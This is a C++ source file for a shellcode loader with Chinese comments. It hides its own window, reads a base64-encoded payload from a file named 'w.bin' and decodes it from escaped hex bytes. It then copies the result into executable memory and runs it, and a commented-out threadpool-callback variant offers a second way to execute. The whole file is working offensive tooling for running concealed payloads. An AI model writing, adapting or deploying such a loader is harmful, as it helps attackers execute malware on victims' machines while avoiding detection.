// Base64ShellCodeLoader.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include "base64.h"
DWORD GetPeFile(LPCWSTR Filepath, _Outptr_ char*& Buffer);
void* Buf16ToMem16(std::string sBuf, _Outptr_ DWORD& BufSize);

int main()
{
    //隐藏
    ShowWindow(GetForegroundWindow(), 0);

    DWORD FileShellCodeSizeA = NULL;

    char* Buffer = NULL;
    DWORD ss = GetPeFile(L"w.bin", Buffer);
    if (ss == NULL)
    {
        exit(0);
    }
    base64 b64 = base64();
    std::string decoded = b64.base64_decode((char*)Buffer);
    DWORD dwSize = 0;
    void* ShellBuffer = Buf16ToMem16(decoded, dwSize);

    char* shellcode = (char*)VirtualAlloc(
        NULL,
        2000,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    //// 将shellcode复制到可执行的内存页中
    CopyMemory(shellcode, ShellBuffer, dwSize);

    //创建事件描述符
    /* HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
    //创建新的等待对象。
        PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcode, NULL, NULL);
        //创建新的等待对象。
        SetThreadpoolWait(threadPoolWait, event, NULL);
        //等待指定的对象处于信号状态或超时间隔过去。
        WaitForSingleObject(event, INFINITE);*/

    ((void(*)())shellcode)();

}


DWORD GetPeFile(LPCWSTR Filepath, _Outptr_ char*& Buffer)
{

    //创建文件打开
    HANDLE lpFile = CreateFile(Filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (lpFile == INVALID_HANDLE_VALUE)
    {

        return 0;
    }
    //获取文件大小
    DWORD FileSize = GetFileSize(lpFile, NULL);
    //申请空间
    Buffer = (char*)malloc(FileSize * sizeof(BYTE));
    //读取所有内容
    DWORD RealSize;
    ReadFile(lpFile, (DWORD*)Buffer, FileSize, &RealSize, NULL);
    CloseHandle(lpFile);

    return FileSize;
}




void* Buf16ToMem16(std::string sBuf, _Outptr_ DWORD& BufSize)
{
    std::string strBuf = sBuf;
    std::string strtmp;
    DWORD dwSt = 0, dwEd = 0, dwCount = 0, dwStrSz = 0;
    BYTE* bTmp = new BYTE{ 0 };
    void* TmpVoid;
    void* RetVoid;

    dwStrSz = strBuf.size();
    dwSt = strBuf.find("\\", dwSt ? dwSt + 1 : 0);
    TmpVoid = new char[dwStrSz] {0};
    while (true)
    {
        dwEd = strBuf.find("\\", dwSt + 1);
        strtmp = strBuf.substr(dwSt + 1, (dwEd - dwSt - 1));
        sscanf_s(strtmp.c_str(), "x%x", &bTmp);
        memcpy_s((char*)TmpVoid + dwCount, 1, &bTmp, 1);

        if (dwEd == std::string::npos)
        {
            break;
        }

        ++dwCount;
        dwSt = dwEd;

    }
    RetVoid = new char[dwCount + 1]{ 0 };
    memcpy_s(RetVoid, dwCount + 1, TmpVoid, dwCount + 1);
    delete TmpVoid;
    TmpVoid = NULL;
    BufSize = dwCount + 1;
    return RetVoid;


}
